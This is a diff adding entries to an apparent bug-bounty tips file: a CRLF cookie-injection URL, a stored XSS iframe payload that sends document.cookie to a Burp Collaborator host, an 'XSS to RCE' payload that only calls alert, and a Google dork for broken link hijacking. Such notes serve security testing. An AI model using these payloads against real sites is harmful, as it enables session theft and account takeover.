@@ -128,3 +128,26 @@ https://www.abc.com/%0D%0ASet-Cookie:crlfinjection=crlfinjection
 ```
 ![img](https://pbs.twimg.com/media/EyswkGtU4Ac3K3J?format=jpg&name=small)
 
+
+# 📅 19-Apr-2021
+## Stored XSS
+```html
+<iframe %00 src= javascript:fetch(\"//XXXXXXXXXXXXXXXXXXXXXXXXXXXXX.burpcollaborator.net/?param=\"+document.cookie)  %00>
+```
+***Source: https://infosecwriteups.com/pwning-your-assignments-stored-xss-via-graphql-endpoint-6dd36c8a19d5***
+
+## Password change misconfiguration
+- https://0x2m.medium.com/misconfiguration-in-change-password-functionality-leads-to-account-takeover-1314b5507abf
+
+## Reflected XSS to RCE
+```js
+"><img src=x onerror=alert(whoami)>
+```
+
+## Google Dork to find Broken Link Hijacking:
+
+`site:*.target.* link:twitter`
+
+Then if you find a broken link, just create an account and claim it.
+
+
